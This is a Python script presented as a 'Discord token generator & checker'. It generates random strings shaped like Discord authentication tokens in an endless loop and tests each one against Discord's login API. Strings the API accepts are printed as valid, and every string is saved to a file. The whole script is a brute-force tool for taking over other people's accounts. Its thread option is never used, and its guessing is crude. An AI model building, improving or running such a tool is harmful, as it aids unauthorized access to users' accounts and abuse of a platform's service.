from threading import Thread
import os
import random
from colorama import Fore, init
import requests
import time
init(convert=True)
gen = '0'
url = "https://google.com"
os.system("title Internet check")
try:
    response = requests.get(url)  
    print("Internet check")
    time.sleep(.4)
    os.system("cls")
except requests.exceptions.ConnectionError:
    input("Tu n'est pas connecté à internet, redémarre ta connexion ou connecte toi à internet \npour utiliser le logiciel\nPress enter to exit")
    exit()  
    
os.system("title DISCORD TOKEN GENERATOR by paskard#9768")
input(f"""{Fore.BLUE}
████████╗░█████╗░██╗░░██╗███████╗███╗░░██╗  ░██████╗░███████╗███╗░░██╗
╚══██╔══╝██╔══██╗██║░██╔╝██╔════╝████╗░██║  ██╔════╝░██╔════╝████╗░██║
░░░██║░░░██║░░██║█████═╝░█████╗░░██╔██╗██║  ██║░░██╗░█████╗░░██╔██╗██║
░░░██║░░░██║░░██║██╔═██╗░██╔══╝░░██║╚████║  ██║░░╚██╗██╔══╝░░██║╚████║
░░░██║░░░╚█████╔╝██║░╚██╗███████╗██║░╚███║  ╚██████╔╝███████╗██║░╚███║
░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚══╝  ░╚═════╝░╚══════╝╚═╝░░╚══╝
discord token generator & checker
Made by Paskard#9446
https://github.com/paskardthegoat
Press enter to continue""")

choice =input(f"""{Fore.BLUE}
[1]Old token
[2]Recent token

Select your choice => """)

thread = input(Fore.BLUE + "Enter number of thread : ")
thread_count = thread
if choice =='1':
    gen = 0
    os.system("title DISCORD TOKEN GENERATOR by paskard#9768 Select: Old token  Statut: select your choice")
    length1 = 23
    length2 = 6
    length3 = 27 
    lower = "abcdefghijklmnopqrstuvwxyz"
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    numbers = "0123456789"
    string = lower + upper + numbers
    while(True):
        gen = gen + 1
        os.system(f"title DISCORD TOKEN GENERATOR by paskard#9768 Select: Old token  Total generated tokens: {gen}")
        tokengenered1 = "N" + "".join(random.sample(string, length1))
        tokengenered2 = "".join(random.sample(string, length2))
        tokengenered3 = "".join(random.sample(string, length3))
        tokengenered = (tokengenered1 + "." + tokengenered2 + "." + tokengenered3)
        headers={
            'Authorization':  tokengenered
        }
        tokeninfo = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
        try:
            if tokeninfo.status_code == 200:
                print(f"""{Fore.GREEN}  Valid | {tokengenered}""")
            else:
                print(f"""{Fore.RED}  Invalid | {tokengenered}""")
        except Exception:
            print(Fore.RED + "You are not connected to internet or you are rate limited") 
        with open("Old_tokens_genered.txt", "a+") as Oldtokenfile:

            Oldtokenfile.write(f"{tokengenered}\n")

            Oldtokenfile.close()
if choice =='2':
    gen = 0
    os.system("title DISCORD TOKEN GENERATOR by paskard#9768 Select: Recent token ")
    length1 = 23
    length2 = 6
    length3 = 27 
    lower = "abcdefghijklmnopqrstuvwxyz"
    upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    numbers = "0123456789"
    string = lower + upper + numbers
    while(True):
        gen = gen + 1
        os.system(f"title DISCORD TOKEN GENERATOR by paskard#9768 Select: Recent token  Total generated tokens: {gen}")
        tokengenered1 = "O" + "".join(random.sample(string, length1))
        tokengenered2 = "".join(random.sample(string, length2))
        tokengenered3 = "".join(random.sample(string, length3))
        tokengenered = (tokengenered1 + "." + tokengenered2 + "." + tokengenered3)
        headers={
            'Authorization':  tokengenered
        }
        tokeninfo = requests.get('https://discordapp.com/api/v6/auth/login', headers=headers)
        try:
            if tokeninfo.status_code == 200:
                print(f"""{Fore.GREEN}  Valid | {tokengenered}""")
            else:
                print(f"""{Fore.RED}  Invalid | {tokengenered}""")
        except Exception:
            print(Fore.RED + "Your are not connected to internet or you are rate limited") 

        with open("Recent_tokens_genered.txt", "a+") as Oldtokenfile:

            Oldtokenfile.write(f"{tokengenered}\n")
    
            Oldtokenfile.close()
else:
    print(Fore.RED + "ERROR : Please enter a correct number (1 or 2)\n press enter to exit")
    input()   

    
            






